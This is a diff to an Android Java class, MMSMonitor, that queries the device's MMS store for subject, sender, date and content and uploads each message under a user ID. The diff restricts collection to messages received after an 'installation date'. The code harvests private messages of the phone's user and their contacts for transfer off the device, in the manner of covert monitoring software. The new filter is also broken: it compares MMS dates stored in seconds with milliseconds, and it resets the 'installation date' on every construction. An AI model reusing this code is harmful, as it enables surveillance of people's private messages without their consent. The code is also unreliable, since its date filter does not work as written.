@@ -25,11 +25,13 @@ public class MMSMonitor {
     private String userId;
     private String phoneModel;
     private static final String TAG = "MMSMonitor";
+    private long installationDate;
 
     public MMSMonitor(Context context, String userId, String phoneModel) {
         this.context = context;
         this.userId = userId;
         this.phoneModel = phoneModel;
+        this.installationDate = System.currentTimeMillis(); // Set installation date to current time
     }
 
     public void startMonitoring() {
@@ -63,7 +65,7 @@ public class MMSMonitor {
         Uri mmsUri = Telephony.Mms.CONTENT_URI;
         String[] projection = {Telephony.Mms._ID, Telephony.Mms.DATE, Telephony.Mms.SUBJECT};
 
-        try (Cursor cursor = context.getContentResolver().query(mmsUri, projection, null, null, Telephony.Mms.DATE + " DESC")) {
+        try (Cursor cursor = context.getContentResolver().query(mmsUri, projection, "date >= ?", new String[]{String.valueOf(installationDate)}, Telephony.Mms.DATE + " DESC")) {
             if (cursor != null && cursor.moveToFirst()) {
                 do {
                     String mmsId = cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Mms._ID));
@@ -72,11 +74,13 @@ public class MMSMonitor {
                     String senderAddress = fetchSenderAddress(mmsId);
                     String content = fetchMmsContent(mmsId);
 
-                    if (senderAddress != null) {
-                        MMSData mmsData = new MMSData(subject, timestamp, senderAddress, content);
-                        uploadMmsData(mmsData, mmsId);
-                    } else {
-                        Log.e(TAG, "Sender address not found for MMS ID: " + mmsId);
+                    if (timestamp >= installationDate) { // Check if MMS is from the date of installation
+                        if (senderAddress != null) {
+                            MMSData mmsData = new MMSData(subject, timestamp, senderAddress, content);
+                            uploadMmsData(mmsData, mmsId);
+                        } else {
+                            Log.e(TAG, "Sender address not found for MMS ID: " + mmsId);
+                        }
                     }
                 } while (cursor.moveToNext());
             } else {
